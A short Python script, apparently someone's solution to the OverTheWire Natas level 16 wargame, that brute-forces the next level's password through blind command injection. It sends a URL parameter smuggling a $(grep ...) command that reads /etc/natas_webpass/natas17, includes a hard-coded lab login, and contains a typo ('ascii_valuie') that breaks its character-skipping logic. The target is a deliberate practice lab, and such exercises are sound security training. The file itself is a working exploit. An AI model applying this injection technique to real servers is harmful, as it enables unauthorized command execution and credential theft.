import requests
import os

# works the same as with natas16 except for the fact that youre exploiting grep.
# had to look this one up to be honest.
# the word african has to be there in order to generate results iff grep statement in query is true

def blind_grep():
    solution = ""
    # We know the password to be 32 characters in length, so iterate 32 times please.
    for i in range(32): 
        char_found = False
        ascii_value = 48
        while not char_found:
            test_request = requests.get('http://natas16.natas.labs.overthewire.org/?needle=hello%0A$(grep ^' + solution + chr(ascii_value) + ' /etc/natas_webpass/natas17)africans&submit=Search',auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
            if "hello" in test_request.text: 
                char_found = True
                solution = solution + chr(ascii_value)
                os.system('clear')
                print(solution)
            else:
                ascii_value = ascii_value + 1
                # skip non (alpha)nummerical values
                if ascii_value == 58:
                    ascii_value = ascii_value + 7
                elif ascii_value == 91:
                    ascii_valuie = ascii_value + 6
    return True

blind_grep()
